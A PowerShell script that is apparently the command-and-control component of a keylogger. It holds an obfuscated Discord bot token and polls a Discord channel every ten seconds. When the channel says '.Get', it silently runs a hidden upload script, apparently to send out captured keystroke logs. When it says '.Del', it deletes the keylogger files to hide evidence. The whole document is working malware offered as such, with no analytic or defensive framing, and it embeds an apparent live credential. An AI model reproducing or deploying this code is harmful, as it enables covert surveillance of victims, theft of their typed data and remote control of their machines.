
$oo = "TVRNMU5ETXhORGN3TnpjMk5qUTRNRGt3TmcuRy1mMVVSLk0telNmWF9vUE5FajVKQXFGZnFnNGFaNl90b29UQ0EwUlBHNXhv"
$ooo = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($oo))

$oooo = "1342066027781034063"
$apiURL = "https://discord.com/api/v9/channels/$oooo/messages?limit=5"

$headers = @{
    "Authorization" =  "Bot $ooo"
}
while ($true) {
    try {
        $response = Invoke-RestMethod -Uri $apiURL -Headers $headers -Method Get

        foreach ($message in $response) {
            if ($message.content -eq ".Get") {
                Start-Process -FilePath "powershell.exe" -ArgumentList "-windowstyle hidden -ExecutionPolicy Bypass -File `".\uploadLog.ps1`""
                break 
            }
            elseif ($message.content -eq ".Del"){
                del keylogger.ps1;del uploadLog.ps1;del getInst.ps1
            }
        }
    }
    catch {
        Write-Output "[-] Error: $_"
    }

    Start-Sleep -Seconds 10  # Tránh spam API Discord
}
